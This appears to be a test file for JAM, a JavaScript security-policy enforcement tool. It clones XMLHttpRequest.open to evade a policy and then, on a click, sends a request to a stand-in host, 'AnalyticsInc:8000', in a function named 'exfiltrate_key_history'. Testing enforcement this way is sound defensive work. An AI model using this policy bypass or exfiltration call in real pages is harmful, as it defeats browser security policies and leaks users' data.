// exfil_test_clone3.js
function exfiltrate_key_history() {
  function v0() {
    function temp() {
      return JAM.call(that.apply, that, [this, arguments]);
    }
    var that = this;
    var key$$14;
    for (key$$14 in this) {
      if (this.hasOwnProperty(key$$14)) {
        JAM.set(temp, key$$14, JAM.get(this, key$$14, JAM.policy.p1));
      }
    }
    return temp;
  }
  xmlhttp = new XMLHttpRequest;
  introspect(JAM.policy.p1) {
    var v2 = xmlhttp.open
  }
  v2.clone = v0;
  var v3 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v5 = xmlhttp.open
  }
  var v6 = v5.clone();
  v3.opennew = v6;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true]);
  xmlhttp.send(null);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

